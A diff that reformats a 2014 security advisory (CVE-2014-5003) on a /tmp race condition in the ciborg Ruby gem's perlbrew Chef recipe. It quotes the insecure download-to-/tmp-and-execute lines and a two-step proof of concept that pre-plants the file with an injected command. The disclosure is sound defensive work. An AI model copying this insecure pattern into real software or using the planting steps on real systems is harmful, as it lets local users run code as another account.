@@ -1,26 +1,32 @@
-                                Advisory #: 30
-Title: Vulnerability Report for Ruby Gem ciborg-3.0.0
-Author:Larry W. Cashdollar, @_larry0
-Date: 2014-06-01
-Download Site: http://rubygems.org/gems/ciborg
-Vendor:pivotallabs.com
-Vendor Notified: 2014-06-25
-Vendor Contact: commoncode[at]pivotallabs.com
-Description: Rails generators that make it easy to spin up a CI instance in the
-cloud. Formerly known as 'Lobot'.
-Vulnerability:
-From: ./ciborg-3.0.0/chef/travis-cookbooks/ci_environment/perlbrew/recipes/
-default.rb There is a /tmp file race condition when creating /tmp/perlbrew-
-installer if a malicious local user creates the file first they can overwrite
-the contents with their own code executing it as the ciborg process owner. 014:
-curl -s https://raw.github.com/gugod/App-perlbrew/master/perlbrew-install -o /
-tmp/perlbrew-installer 15: chmod +x /tmp/perlbrew-installer 16: /tmp/perlbrew-
-installer
-CVE-2014-5003
-JSON:Export
-Exploit Code:
-   1. touch /tmp/perlbrew-installer
-   2. echo "id >/tmp/foo" >> /tmp/perlbrew-installer
-   3.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/ciborg-3.0.0.html
+
+                               Advisory #: 30
+
+   Title: Vulnerability Report for Ruby Gem ciborg-3.0.0
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2014-06-01
+   Download Site: http://rubygems.org/gems/ciborg
+   Vendor: pivotallabs.com
+   Vendor Notified: 2014-06-25
+   Vendor Contact: commoncode[at]pivotallabs.com
+   Description: Rails generators that make it easy to spin up a CI
+   instance in the cloud. Formerly known as 'Lobot'.
+   Vulnerability:
+   From:
+   ./ciborg-3.0.0/chef/travis-cookbooks/ci_environment/perlbrew/recipes/de
+   fault.rb There is a /tmp file race condition when creating
+   /tmp/perlbrew-installer if a malicious local user creates the file
+   first they can overwrite the contents with their own code executing it
+   as the ciborg process owner. 014: curl -s
+   https://raw.github.com/gugod/App-perlbrew/master/perlbrew-install -o
+   /tmp/perlbrew-installer 15: chmod +x /tmp/perlbrew-installer 16:
+   /tmp/perlbrew-installer
+   CVE-2014-5003
+   JSON: Export
+   Exploit Code:
+
+    1. touch /tmp/perlbrew-installer
+    2. echo "id >/tmp/foo" >> /tmp/perlbrew-installer
+    3.
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisories/ciborg-3.0.0.html
